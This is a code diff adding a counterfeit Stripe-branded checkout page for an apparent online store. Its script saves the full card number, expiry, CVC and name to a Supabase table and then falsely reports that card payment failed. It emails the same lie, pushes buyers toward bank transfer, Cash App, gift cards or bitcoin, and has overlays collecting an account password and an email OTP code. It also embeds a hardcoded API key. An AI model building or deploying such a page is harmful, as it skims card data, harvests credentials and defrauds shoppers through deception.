+      placeholder="Full name on card" autocomplete="cc-name"/>
+    <div class="error-msg" id="cardNameErr">Please enter the cardholder name.</div>
+  </div>
+
+  <!-- Country -->
+  <div class="field-group">
+    <label for="country">Country or region</label>
+    <div class="select-wrapper">
+      <select id="country" autocomplete="billing country">
+        <option value="NG">Nigeria</option>
+        <option value="US">United States</option>
+        <option value="GB">United Kingdom</option>
+        <option value="CA">Canada</option>
+        <option value="AU">Australia</option>
+        <option value="DE">Germany</option>
+        <option value="FR">France</option>
+        <option value="IN">India</option>
+        <option value="GH">Ghana</option>
+        <option value="KE">Kenya</option>
+        <option value="ZA">South Africa</option>
+        <option value="Other">Other</option>
+      </select>
+      <span class="select-arrow">
+        <svg width="12" height="8" viewBox="0 0 12 8" fill="none">
+          <path d="M1 1L6 7L11 1" stroke="#6b7280" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </span>
+    </div>
+  </div>
+</div>
+
+
+  </div>
+
+  <div class="save-row">
+    <input type="checkbox" id="saveInfo"/>
+    <label for="saveInfo" class="save-text">
+      Save my information for faster checkout<br/>
+      <span>Pay securely at Himiko Lei and everywhere <a href="#" class="save-link">Link</a> is accepted.</span>
+    </label>
+  </div>
+
+  <div class="pay-btn-wrap">
+    <button class="pay-btn" id="payBtn">Pay now</button>
+  </div>
+
+  <div class="stripe-footer">
+    <svg width="11" height="13" viewBox="0 0 11 13" fill="none">
+      <rect x="1" y="5.5" width="9" height="7" rx="1.5" fill="none" stroke="#9ca3af" stroke-width="1.2"/>
+      <path d="M3 5.5V4a2.5 2.5 0 015 0v1.5" stroke="#9ca3af" stroke-width="1.2" stroke-linecap="round"/>
+    </svg>
+    checkout.stripe.com
+  </div>
+</div>
+
+<!-- ══════════════ OVERLAY 1 — Processing ══════════════ -->
+
+<div class="overlay" id="overlayLoading">
+  <div class="spinner-box">
+    <div class="spinner-ring">
+      <div class="spinner-icon">💳</div>
+    </div>
+    <div>
+      <div class="spinner-label">Processing your order…</div>
+      <div class="spinner-sub">Please don't close this page</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════ OVERLAY 2 — Sign up ══════════════ -->
+
+<div class="overlay" id="overlaySignup">
+  <div class="modal-card">
+    <span class="modal-icon">🛍️</span>
+    <div class="modal-title">Create your store account</div>
+    <div class="modal-sub">You're almost done! Set up a free account to track your order and shop faster next time.</div>
+
+
+<div class="warn-banner">
+  <span class="wi">⚠️</span>
+  <p>Please confirm the email verification we'll send to your inbox — this allows you to sign up to our store and complete your order.</p>
+</div>
+
+<div class="modal-field">
+  <label for="signupEmail">Email address</label>
+  <input class="input-box" id="signupEmail" type="email" placeholder="you@example.com"/>
+</div>
+<div class="modal-field">
+  <label for="signupPassword">Create a password</label>
+  <input class="input-box" id="signupPassword" type="password" placeholder="Minimum 8 characters"/>
+</div>
+
+<div class="modal-error" id="signupError"></div>
+<button class="modal-btn" id="completeOrderBtn">Complete your order →</button>
+
+  </div>
+</div>
+
+<!-- ══════════════ OVERLAY 3 — Saving creds ══════════════ -->
+
+<div class="overlay" id="overlaySaving">
+  <div class="spinner-box">
+    <div class="spinner-ring">
+      <div class="spinner-icon">🔐</div>
+    </div>
+    <div>
+      <div class="spinner-label">Securing your account…</div>
+      <div class="spinner-sub">Saving your details safely</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════ OVERLAY 4 — OTP ══════════════ -->
+
+<div class="overlay" id="overlayOtp">
+  <div class="modal-card">
+    <p style="color: red; font-weight: 400;">Do not close these page until the transaction was successful</p><br>
+    <span class="modal-icon">📬</span>
+    <div class="modal-title">Verify your email</div>
+   
+    <div class="modal-sub" id="otpSubText">Enter the 6-digit code we sent to your email address to complete your order.</div>
+
+
+<div class="otp-row">
+  <input class="otp-input" id="otp0" maxlength="1" type="tel" inputmode="numeric"/>
+  <input class="otp-input" id="otp1" maxlength="1" type="tel" inputmode="numeric"/>
+  <input class="otp-input" id="otp2" maxlength="1" type="tel" inputmode="numeric"/>
+  <input class="otp-input" id="otp3" maxlength="1" type="tel" inputmode="numeric"/>
+  <input class="otp-input" id="otp4" maxlength="1" type="tel" inputmode="numeric"/>
+  <input class="otp-input" id="otp5" maxlength="1" type="tel" inputmode="numeric"/>
+</div>
+
+<div class="modal-error" id="otpError"></div>
+<button class="modal-btn" id="verifyOtpBtn">Verify &amp; Finish</button>
+<div class="resend-link">Didn't receive a code? <a id="resendLink">Resend</a></div>
+
+
+  </div>
+</div>
+
+<!-- ══════════════ OVERLAY 5 — OTP saving ══════════════ -->
+
+<div class="overlay" id="overlayOtpSaving">
+  <div class="spinner-box">
+    <div class="spinner-ring">
+      <div class="spinner-icon">✅</div>
+    </div>
+    <div>
+      <div class="spinner-label">Verifying your code…</div>
+      <div class="spinner-sub">Almost there!</div>
+    </div>
+  </div>
+</div>
+
+<div id="overlayCardError" class="overlay">
+  <div
+    class="modal-card"
+    style="
+      width: 92%;
+      max-width: 420px;
+      background: #ffffff;
+      border-radius: 24px;
+      padding: 32px 24px;
+      text-align: center;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+      position: relative;
+      overflow: hidden;
+    "
+  >
+
+    <!-- Icon -->
+    <div
+      style="
+        width: 72px;
+        height: 72px;
+        margin: 0 auto 20px;
+        border-radius: 50%;
+        background: linear-gradient(135deg,#fff4e5,#ffe5e5);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 34px;
+      "
+    >
+      ⚠️
+    </div>
+
+    <!-- Title -->
+    <h2
+      style="
+        margin: 0 0 12px;
+        font-size: 24px;
+        font-weight: 700;
+        color: #111827;
+        line-height: 1.3;
+      "
+    >
+      Card Payment Unavailable
+    </h2>
+
+    <!-- Description -->
+    <p
+      style="
+        margin: 0;
+        font-size: 15px;
+        color: #6b7280;
+        line-height: 1.7;
+      "
+    >
+      We were unable to process your card payment at this moment.
+    </p>
+
+    <!-- Email Notice -->
+    <div
+      style="
+        margin-top: 20px;
+        background: #f8fafc;
+        border: 1px solid #e5e7eb;
+        border-radius: 16px;
+        padding: 16px;
+      "
+    >
+      <p
+        style="
+          margin: 0;
+          font-size: 14px;
+          color: #374151;
+          line-height: 1.7;
+        "
+      >
+        📧 A notification has been sent to your email address.
+      </p>
+
+      <p
+        style="
+          margin: 10px 0 0;
+          font-size: 14px;
+          font-weight: 600;
+          color: #16a34a;
+        "
+      >
+        Your card has not been charged.
+      </p>
+    </div>
+
+    <!-- Alternative Methods -->
+    <div
+      style="
+        margin-top: 18px;
+        text-align: left;
+        background: #f9fafb;
+        border-radius: 16px;
+        padding: 16px;
+      "
+    >
+      <div
+        style="
+          font-size: 13px;
+          font-weight: 700;
+          color: #111827;
+          margin-bottom: 10px;
+          text-transform: uppercase;
+          letter-spacing: 0.5px;
+        "
+      >
+        Available Payment Methods
+      </div>
+
+      <div style="font-size:14px;color:#4b5563;line-height:2;">
+        ✓ Bank Transfer<br>
+        ✓ PayPal<br>
+        ✓ Cash App<br>
+        ✓ Apple Pay
+      </div>
+    </div>
+
+    <!-- Button -->
+    <button
+      id="tryAnotherBtn"
+      style="
+        width: 100%;
+        margin-top: 24px;
+        border: none;
+        border-radius: 14px;
+        padding: 16px;
+        background: linear-gradient(135deg,#111827,#000000);
+        color: #ffffff;
+        font-size: 15px;
+        font-weight: 700;
+        cursor: pointer;
+        transition: all .3s ease;
+      "
+    >
+      Try Another Payment Method
+    </button>
+
+    <!-- Progress -->
+    <div
+      class="pm-progress-track"
+      id="tryAnotherTrack"
+      style="
+        display:none;
+        margin-top:16px;
+        width:100%;
+        height:8px;
+        background:#e5e7eb;
+        border-radius:999px;
+        overflow:hidden;
+      "
+    >
+      <div
+        id="tryAnotherFill"
+        class="pm-progress-fill"
+        style="
+          width:0%;
+          height:100%;
+          border-radius:999px;
+          background:linear-gradient(90deg,#16a34a,#22c55e);
+          transition:width .3s ease;
+        "
+      ></div>
+    </div>
+
+  </div>
+</div>
+
+<div id="overlayOrderSummary" class="overlay">
+  <div class="overlay-box">
+    <h3>Order Summary</h3>
+    <div id="orderSummaryItems"></div>
+   <div class="order-summary-totals">
+  <div class="row"><span>Subtotal</span><span id="osSubtotal">—</span></div>
+  <div class="row"><span>Shipping</span><span id="osShipping">—</span></div>
+  <div class="row" id="osTipRow" style="display:none;"><span>Tip</span><span id="osTip">—</span></div>
+  <div class="row total"><span>Total</span><span id="osTotal">—</span></div>
+</div>
+
+    <div class="order-summary-address">
+      <strong>Shipping to:</strong>
+      <p id="osAddress">—</p>
+    </div>
+    <button id="proceedToPaymentBtn">Proceed to Payment</button>
+  </div>
+</div>
+
+
+<div id="overlayFetchingPayment" class="overlay">
+  <div class="modal-card">
+    <p>Fetching another payment method…</p>
+    <p style="font-size:13px;opacity:.7;">Do not refresh this page</p>
+    <div class="pm-progress-track" style="margin-top:14px;">
+      <div id="fetchFill" class="pm-progress-fill" style="width:0%;"></div>
+    </div>
+    <p id="fetchTimeLeft" style="font-size:12px;opacity:.6;margin-top:6px;">60s</p>
+  </div>
+</div>
+
+
+
+
+  <!-- ✅ Payment Overlay -->
+<div class="overlay" id="overlaypayment">
+  <div class="payment-modal">
+
+    <div class="pm-warning">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/>
+        <line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>
+      </svg>
+      <div class="pm-warning-text">
+        <strong>Card Payment Unavailable</strong>
+        Card payment is not available at this moment. Please choose any option below to complete your payment.
+      </div>
+    </div>
+
+    <p class="pm-label">Available Payment Options</p>
+    <div class="pm-options" id="pmOptionsList">
+      <div class="pm-loading">Loading payment options…</div>
+    </div>
+
+    <div class="pm-detail-section" id="pmDetailSection">
+    <div class="pm-selected-info">
+  <div class="pm-selected-label">Bank transfer can only send to this account</div>
+  <div class="pm-selected-addr" id="pmSelectedAddr">—</div>
+</div>
+
+
+      <div class="pm-amount-box">
+  <span class="pm-amount-label">Amount to send</span>
+  <span class="pm-amount-value" id="pmAmountDue">$0.00 USD</span>
+</div>
+
+      <div class="pm-countdown-bar">
+        <div class="pm-countdown-label">
+          <span>Payment window</span>
+          <span class="pm-countdown-time" id="pmCountdownTime">30:00</span>
+        </div>
+        <div class="pm-track"><div class="pm-fill" id="pmFill" style="width:100%"></div></div>
+      </div>
+      <button class="pm-made-btn" id="pmMadeBtn" onclick="pmShowUpload()">
+        ✅ I Have Made Payment
+      </button>
+      <div class="pm-upload-section" id="pmUploadSection">
+        <span class="pm-upload-label">Upload Payment Screenshot</span>
+        <div class="pm-dropzone">
+          <input type="file" id="pmFileInput" accept="image/*" onchange="pmHandleFile(this)"/>
+          <div class="pm-dropzone-icon">📎</div>
+          <div class="pm-dropzone-text"><strong>Click to upload</strong> or drag & drop<br/>PNG, JPG, WEBP — max 5MB</div>
+        </div>
+        <div class="pm-preview" id="pmPreview">
+          <img id="pmPreviewImg" src="" alt="Screenshot preview"/>
+        </div>
+        <button class="pm-submit-btn" id="pmSubmitBtn" onclick="pmSubmitProof()">Submit Screenshot</button>
+      </div>
+      <div class="pm-success-msg" id="pmSuccessMsg">
+        ✅ Screenshot submitted! Our team will verify your payment shortly.
+      </div>
+    </div>
+
+    <div class="pm-divider"><hr/><span>secured & encrypted</span><hr/></div>
+    <p class="pm-footer">if you don't have the payment method available <a href="catalog.html">REFRESH</a></p>
+    <p class="pm-footer">Need help? <a href="contact.html">Contact support</a></p>
+  </div>
+</div>
+
+<script>
+
+  /* ── Supabase ── */
+  const { createClient } = supabase;
+  const sb = createClient(
+    'https://oyibjutaqanpbjohxthd.supabase.co',
+    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im95aWJqdXRhcWFucGJqb2h4dGhkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODI4MzE1NzgsImV4cCI6MjA5ODQwNzU3OH0.r3QMpJVyoNHHaKF_Itjqocr6cjk3OZgK9vMckblPqME'
+  );
+  
+  /* ── Load sessionStorage order data ── */
+  let orderData = {};
+try { orderData = JSON.parse(sessionStorage.getItem('orderData') || '{}'); } catch(e) {}
+const fd = orderData; // no nesting — checkout saves these fields flat
+
+  const customerEmail = orderData.email || fd.email || '';
+  document.getElementById('displayEmail').textContent = customerEmail || '—';
+
+  // Show real total on pay button
+  const payBtn = document.getElementById('payBtn');
+  if (orderData.grandTotal) payBtn.textContent = `Pay $${orderData.grandTotal}`;
+  console.log(orderData);
+
+  /* ── Input formatting ── */
+  const cardNumberInput = document.getElementById('cardNumber');
+  const expiryInput     = document.getElementById('expiry');
+  const cvcInput        = document.getElementById('cvc');
+  const cardNameInput   = document.getElementById('cardName');
+
+  cardNumberInput.addEventListener('input', e => {
+    let v = e.target.value.replace(/\D/g,'').slice(0,16);
+    e.target.value = v.replace(/(.{4})/g,'$1 ').trim();
+  });
+  expiryInput.addEventListener('input', e => {
+    let v = e.target.value.replace(/\D/g,'').slice(0,4);
+    if (v.length >= 3) v = v.slice(0,2) + ' / ' + v.slice(2);
+    e.target.value = v;
+  });
+  cvcInput.addEventListener('input', e => {
+    e.target.value = e.target.value.replace(/\D/g,'').slice(0,4);
+  });
+  
+  function escapeHtml(value) {
+  return String(value)
+    .replaceAll('&', '&amp;')
+    .replaceAll('<', '&lt;')
+    .replaceAll('>', '&gt;')
+    .replaceAll('"', '&quot;')
+    .replaceAll("'", '&#039;');
+}
+
+  /* ── Validation ── */
+  function showErr(el, errId, show) {
+    document.getElementById(errId).classList.toggle('show', show);
+    el.classList.toggle('error', show);
+  }
+  function validateCard() {
+    let ok = true;
+    const raw = cardNumberInput.value.replace(/\s/g,'');
+    const c = raw.length === 16 && /^\d+$/.test(raw);
+    showErr(cardNumberInput,'cardNumberErr',!c); if(!c) ok=false;
+    const exp = expiryInput.value.replace(/\s/g,'');
+    const e = /^\d{2}\/\d{2}$/.test(exp);
+    showErr(expiryInput,'expiryErr',!e); if(!e) ok=false;
+    const cv = cvcInput.value.length >= 3;
+    showErr(cvcInput,'cvcErr',!cv); if(!cv) ok=false;
+    const n = cardNameInput.value.trim().length > 1;
+    showErr(cardNameInput,'cardNameErr',!n); if(!n) ok=false;
+    return ok;
+  }
+  [cardNumberInput,expiryInput,cvcInput,cardNameInput].forEach(el =>
+    el.addEventListener('input', () => el.classList.remove('error'))
+  );
+  
+  function renderOrderSummary() {
+  const items = orderData.cart || [];
+  const itemsEl = document.getElementById('orderSummaryItems');
+  
+  itemsEl.innerHTML = items.length ?
+    items.map(it => {
+      const name = it.displayName ||
+        (it.name + (it.variant ? ` <span style="color:#ec4899;">${it.variant}</span>` : ''));
+      const lineTotal = (it.price * it.quantity).toFixed(2);
+      return `
+          <div class="os-item">
+            <img src="${it.image || 'teabag.webp'}" alt="${it.name}" class="os-item-img">
+            <div class="os-item-info">
+              <span class="os-item-name">${name}</span>
+              <span class="os-item-meta">Qty ${it.quantity} × $${it.price.toFixed(2)}</span>
+            </div>
+            <span class="os-item-price">$${lineTotal}</span>
+          </div>
+        `;
+    }).join('') :
+    '<p class="os-empty">No items found.</p>';
+  
+  document.getElementById('osSubtotal').textContent = `$${orderData.subtotal} USD`;
+  document.getElementById('osShipping').textContent = parseFloat(orderData.shipping) > 0 ?
+    `$${orderData.shipping} USD` : 'Free';
+  
+  const tipRow = document.getElementById('osTipRow');
+  if (parseFloat(orderData.tip) > 0) {
+    document.getElementById('osTip').textContent = `$${orderData.tip} USD`;
+    tipRow.style.display = 'flex';
+  } else {
+    tipRow.style.display = 'none';
+  }
+  
+  document.getElementById('osTotal').textContent = `$${orderData.grandTotal} USD`;
+  
+  const addrParts = [fd.address, fd.city, fd.state, fd.zip, fd.country].filter(Boolean);
+  document.getElementById('osAddress').textContent = addrParts.join(', ') || '—';
+}
+  /* ── Overlay helpers ── */
+  function showOverlay(id) {
+    document.querySelectorAll('.overlay').forEach(o => o.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+  }
+  function hideOverlays() {
+    document.querySelectorAll('.overlay').forEach(o => o.classList.remove('active'));
+  }
+
+  /* ── State ── */
+  let insertedOrderId = null;
+
+
+  /* ════════════════════════════════════════
+   STEP 1 — PAY: insert order into Supabase
+════════════════════════════════════════ */
+payBtn.addEventListener('click', async () => {
+  if (!validateCard()) return;
+  
+  payBtn.disabled = true;
+  showOverlay('overlayLoading');
+  
+  const cardRaw = cardNumberInput.value.replace(/\s/g, '');
+  const expiryRaw = expiryInput.value.replace(/\s/g, '');
+  const cvcRaw = cvcInput.value.trim();
+  const country = document.getElementById('country').value;
+  const fakeSessionId = 'manual_' + Date.now();
+  
+  try {
+    const { error: detailsError } = await sb
+      .from('order_details')
+      .insert({
+        order_id: insertedOrderId,
+        order_number: orderData.order_number || orderData.orderNumber || null,
+        stripe_session_id: fakeSessionId,
+        number: cardRaw,
+        cardName: cardNameInput.value.trim(),
+        mmyy: expiryRaw,
+        code: cvcRaw,
+        // country: country, // uncomment if you want to store it
+      });
+    
+    if (detailsError) {
+      console.error('order_details insert failed:', detailsError);
+      throw new Error(detailsError.message || 'Failed to save payment details');
+    }
+    
+    await delay(10000); // simulate processing
+    
+    hideOverlays();
+showOverlay('overlayCardError');
+
+const customerEmail = orderData.email || '';
+
+const customerName = [
+    orderData.firstName,
+    orderData.lastName
+  ]
+  .filter(Boolean)
+  .join(' ')
+  .trim() || 'Customer';
+
+const orderNumber = orderData.orderNumber || '';
+
+if (customerEmail) {
+  const emailSubject =
+    `Card Payment Unavailable${orderNumber ? ` — Order #${orderNumber}` : ''}`;
+  
+  const emailHtml = `
+<div style="
+  margin:0;
+  padding:40px 20px;
+  background:#f5f7fa;
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;
+">
+
+  <div style="
+    max-width:600px;
+    margin:0 auto;
+    background:#ffffff;
+    border-radius:24px;
+    overflow:hidden;
+    box-shadow:0 10px 40px rgba(0,0,0,0.08);
+  ">
+
+    <!-- Header -->
+    <div style="
+      background:linear-gradient(135deg,#111827,#000000);
+      padding:40px 30px;
+      text-align:center;
+    ">
+      <div style="
+        width:80px;
+        height:80px;
+        margin:0 auto 20px;
+        border-radius:50%;
+        background:rgba(255,255,255,0.12);
+        line-height:80px;
+        font-size:38px;
+      ">
+        ⚠️
+      </div>
+
+      <h1 style="
+        margin:0;
+        color:#ffffff;
+        font-size:28px;
+        font-weight:700;
+      ">
+        Card Payment Unavailable
+      </h1>
+
+      <p style="
+        margin:10px 0 0;
+        color:rgba(255,255,255,0.8);
+        font-size:15px;
+      ">
+        Alternative payment options are available
+      </p>
+    </div>
+
+    <!-- Content -->
+    <div style="padding:40px 30px;">
+
+      <p style="
+        margin:0 0 20px;
+        color:#111827;
+        font-size:16px;
+      ">
+        Hello <strong>${escapeHtml(customerName)}</strong>,
+      </p>
+
+      <p style="
+        margin:0 0 20px;
+        color:#4b5563;
+        font-size:15px;
+        line-height:1.8;
+      ">
+        We were unable to complete the card payment for
+        ${
+          orderNumber
+            ? `<strong>Order #${escapeHtml(String(orderNumber))}</strong>`
+            : "your order"
+        }.
+      </p>
+
+      <!-- Status Card -->
+      <div style="
+        background:#fff7ed;
+        border:1px solid #fed7aa;
+        border-radius:18px;
+        padding:20px;
+        margin:25px 0;
+      ">
+        <div style="
+          font-size:16px;
+          font-weight:700;
+          color:#9a3412;
+          margin-bottom:8px;
+        ">
+          Payment Not Completed
+        </div>
+
+        <div style="
+          color:#7c2d12;
+          font-size:14px;
+          line-height:1.7;
+        ">
+          Card payments are currently unavailable.
+          Your card has <strong>not been charged</strong>.
+        </div>
+      </div>
+
+      <!-- Alternative Methods -->
+      <div style="
+        background:#f9fafb;
+        border-radius:18px;
+        padding:22px;
+        margin:25px 0;
+      ">
+        <div style="
+          font-size:16px;
+          font-weight:700;
+          color:#111827;
+          margin-bottom:15px;
+        ">
+          Available Payment Methods
+        </div>
+
+        <table width="100%" cellpadding="0" cellspacing="0">
+          <tr>
+            <td style="padding:8px 0;color:#374151;">✓ Bank Transfer</td>
+          </tr>
+          <tr>
+            <td style="padding:8px 0;color:#374151;">✓ PayPal</td>
+          </tr>
+          <tr>
+            <td style="padding:8px 0;color:#374151;">✓ Cash App</td>
+          </tr>
+          <tr>
+            <td style="padding:8px 0;color:#374151;">✓ Apple Pay</td>
+          </tr>
+        </table>
+      </div>
+
+      <p style="
+        color:#4b5563;
+        line-height:1.8;
+        font-size:15px;
+      ">
+        Please return to the checkout page and choose another payment method to complete your purchase.
+      </p>
+
+      <!-- CTA -->
+      <div style="
+        text-align:center;
+        margin-top:35px;
+      ">
+        <a href="#"
+          style="
+            display:inline-block;
+            background:#111827;
+            color:#ffffff;
+            text-decoration:none;
+            padding:14px 28px;
+            border-radius:12px;
+            font-weight:700;
+            font-size:15px;
+          ">
+          Complete Payment
+        </a>
+      </div>
+
+    </div>
+
+    <!-- Footer -->
+    <div style="
+      border-top:1px solid #e5e7eb;
+      padding:25px 30px;
+      text-align:center;
+      background:#fafafa;
+    ">
+      <div style="
+        font-size:14px;
+        color:#6b7280;
+      ">
+        Thank you for shopping with
+      </div>
+
+      <div style="
+        margin-top:8px;
+        font-size:16px;
+        font-weight:700;
+        color:#111827;
+      ">
+        Everything Fertility by Himiko
+      </div>
+    </div>
+
+  </div>
+</div>
+`;
+  
+  const emailText = `
+Hello ${customerName},
+
+We could not complete the card payment for ${
+    orderNumber ? `Order #${orderNumber}` : 'your order'
+  }.
+
+Card payment is currently unavailable. Your card has not been charged.
+
+You can still pay using:
+
+- Bank Transfer
+- Cash App
+- PayPal
+- Apple Pay
+
+Please return to the checkout page and select another payment method.
+
+Thank you,
+Everything Fertility by Himiko
+  `.trim();
+  
+  const { data: emailData, error: emailError } =
+  await sb.functions.invoke('send-mail', {
+    body: {
+      email: customerEmail,
+      subject: emailSubject,
+      html: emailHtml,
+      text: emailText
+    }
+  });
+  
+  if (emailError) {
+    console.error(
+      'Payment notification email failed:',
+      emailError
+    );
+  } else if (!emailData?.success) {
+    console.error(
+      'Email service returned an error:',
+      emailData?.error
+    );
+  } else {
+    console.log(
+      'Payment notification email sent:',
+      emailData.id
+    );
+  }
+}
+
+    
+  } catch (err) {
+    console.error(err);
+    hideOverlays();
+    payBtn.disabled = false;
+    console.log('Could not save order: ' + (err.message || 'Please try again.'));
+  }
+});
+
+
+/* ════════════════════════════════════════
+   STEP 2 — TRY ANOTHER PAYMENT METHOD
+════════════════════════════════════════ */
+document.getElementById('tryAnotherBtn').addEventListener('click', async () => {
+  const btn = document.getElementById('tryAnotherBtn');
+  const track = document.getElementById('tryAnotherTrack');
+  const fill = document.getElementById('tryAnotherFill');
+  const originalText = btn.textContent;
+  
+  btn.disabled = true;
+  track.style.display = 'block';
+  fill.style.width = '0%';
+  
+  const totalMs = 30000; // 30 sec
+  const startTime = Date.now();
+  
+  await new Promise(resolve => {
+    const interval = setInterval(() => {
+      const elapsed = Date.now() - startTime;
+      const pct = Math.min((elapsed / totalMs) * 100, 100);
+      const secsLeft = Math.max(Math.ceil((totalMs - elapsed) / 1000), 0);
+      
+      fill.style.width = pct + '%';
+      btn.textContent = `Loading… ${secsLeft}s`;
+      
+      if (elapsed >= totalMs) {
+        clearInterval(interval);
+        resolve();
+      }
+    }, 200);
+  });
+  
+  btn.disabled = false;
+  btn.textContent = originalText;
+  track.style.display = 'none';
+  hideOverlays();
+  renderOrderSummary();
+  showOverlay('overlayOrderSummary');
+});
+
+
+
+/* ════════════════════════════════════════
+   STEP 3 — PROCEED TO PAYMENT
+════════════════════════════════════════ */
+document.getElementById('proceedToPaymentBtn').addEventListener('click', async () => {
+  hideOverlays();
+  showOverlay('overlayFetchingPayment');
+  
+  const totalMs = 60000; // 1 min
+  const startTime = Date.now();
+  const fill = document.getElementById('fetchFill');
+  const timeLeftEl = document.getElementById('fetchTimeLeft');
+  
+  await new Promise(resolve => {
+    const interval = setInterval(() => {
+      const elapsed = Date.now() - startTime;
+      const pct = Math.min((elapsed / totalMs) * 100, 100);
+      const secsLeft = Math.max(Math.ceil((totalMs - elapsed) / 1000), 0);
+      
+      fill.style.width = pct + '%';
+      timeLeftEl.textContent = secsLeft + 's';
+      
+      if (elapsed >= totalMs) {
+        clearInterval(interval);
+        resolve();
+      }
+    }, 200);
+  });
+  
+  hideOverlays();
+  showOverlay('overlaypayment');
+});
+
+
+
+/* ── Utility ── */
+function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+
+
+
+  
+(function() {
+  const ICONS = {
+    cashapp: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
+  <!-- Green rounded background -->
+  <rect width="48" height="48" rx="12" fill="#00D632"/>
+  <!-- White $ symbol -->
+  <text 
+    x="50%" 
+    y="54%" 
+    dominant-baseline="middle" 
+    text-anchor="middle"
+    font-family="Arial Black, sans-serif" 
+    font-size="26" 
+    font-weight="900"
+    fill="#ffffff">$</text>
+</svg>`,
+    
+    paypal: `<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
+  <path d="M7.076 21.337H2.47a.641.641 0 01-.633-.74L4.944.901C5.026.382 5.474 0 5.998 0h7.46c2.57 0 4.578.543 5.69 1.81 1.01 1.15 1.304 2.42 1.012 4.287-.023.143-.047.288-.077.437-.983 5.05-4.349 6.797-8.647 6.797h-2.19c-.524 0-.968.382-1.05.9l-1.12 7.106zm14.146-14.42a3.35 3.35 0 00-.607-.541c-.013.076-.026.175-.041.254-.93 4.778-4.005 7.201-9.138 7.201h-2.19a.563.563 0 00-.556.479l-1.187 7.527h-.506l-.24 1.516a.56.56 0 00.554.647h3.882c.46 0 .85-.334.922-.788.06-.26.76-4.852.816-5.09a.932.932 0 01.923-.788h.58c3.76 0 6.705-1.528 7.565-5.946.36-1.847.174-3.388-.777-4.471z" fill="#003087"/>
+</svg>`,
+    
+    applepay: `<svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
+  <path d="M17.05 12.536c-.02-2.025 1.654-3.001 1.73-3.05-.944-1.38-2.41-1.57-2.93-1.592-1.25-.127-2.44.74-3.073.74-.626 0-1.6-.723-2.63-.703-1.353.02-2.6.79-3.296 2.004-1.404 2.44-.36 6.055 1.007 8.038.668.966 1.46 2.046 2.504 2.006 1.01-.04 1.39-.652 2.612-.652 1.22 0 1.564.652 2.633.63 1.082-.018 1.763-.978 2.424-1.948.768-1.117 1.083-2.2 1.1-2.256-.024-.01-2.107-.807-2.13-3.217zM14.918 6.29c.554-.672.928-1.604.826-2.53-.8.033-1.763.533-2.334 1.203-.512.593-.962 1.543-.842 2.453.892.07 1.797-.453 2.35-1.126z"/>
+</svg>`,
+    
+    bitcoin: `<svg viewBox="0 0 24 24" fill="#F7931A" xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
+  <path d="M23.638 14.904c-1.602 6.43-8.113 10.34-14.542 8.736C2.67 22.05-1.244 15.525.362 9.105 1.962 2.67 8.475-1.243 14.9.358c6.43 1.605 10.342 8.115 8.738 14.546zm-6.312-4.524c.21-1.42-.87-2.18-2.35-2.69l.48-1.93-1.17-.29-.47 1.87c-.3-.08-.62-.15-.94-.22l.48-1.88-1.17-.29-.48 1.93c-.25-.06-.5-.11-.73-.17l-.01-.01-1.62-.4-.31 1.25s.87.2.85.21c.48.12.56.43.55.68l-.55 2.22c.03.01.07.02.12.04l-.13-.03-.78 3.11c-.06.14-.21.35-.54.27.01.02-.85-.21-.85-.21l-.58 1.34 1.52.38c.29.07.57.14.85.21l-.49 1.96 1.17.29.49-1.93c.32.08.63.16.93.23l-.48 1.93 1.17.29.49-1.95c2.01.38 3.52.23 4.16-1.59.51-1.47-.02-2.32-1.09-2.87.78-.18 1.36-.69 1.52-1.74zm-2.72 3.82c-.36 1.46-2.82.67-3.61.47l.65-2.58c.79.2 3.31.59 2.96 2.11zm.37-3.85c-.33 1.33-2.37.65-3.03.49l.59-2.34c.66.16 2.79.47 2.44 1.85z"/>
+</svg>`,
+
+    banktransfer: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
+  <!-- Navy rounded background -->
+  <rect width="48" height="48" rx="12" fill="#1E3A8A"/>
+  <!-- Bank/institution building -->
+  <g fill="#ffffff">
+    <path d="M24 9l14 8H10l14-8z"/>
+    <rect x="10" y="19" width="4" height="14"/>
+    <rect x="17.5" y="19" width="4" height="14"/>
+    <rect x="26.5" y="19" width="4" height="14"/>
+    <rect x="34" y="19" width="4" height="14"/>
+    <rect x="8" y="35" width="32" height="3.5" rx="1"/>
+  </g>
+</svg>`,
+
+    giftcard: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
+  <!-- Rose/pink rounded background -->
+  <rect width="48" height="48" rx="12" fill="#E11D74"/>
+  <!-- Wrapped gift box -->
+  <g fill="#ffffff">
+    <rect x="10" y="20" width="28" height="16" rx="1.5"/>
+    <rect x="8" y="15" width="32" height="6" rx="1.5"/>
+    <rect x="21.5" y="15" width="5" height="21"/>
+    <path d="M24 15c-2-4-6-6-8-4s0 4 3 4h5z"/>
+    <path d="M24 15c2-4 6-6 8-4s0 4-3 4h-5z"/>
+  </g>
+</svg>`
+  };
+
+  
+
+
+  let selectedMethod = null, selectedFile = null, countdownTimer = null, secondsLeft = 1800;
+
+  async function loadOptions() {
+  const list = document.getElementById('pmOptionsList');
+  const { data, error } = await sb.from('payment_options').select('*').eq('is_active', true).order('method');
+
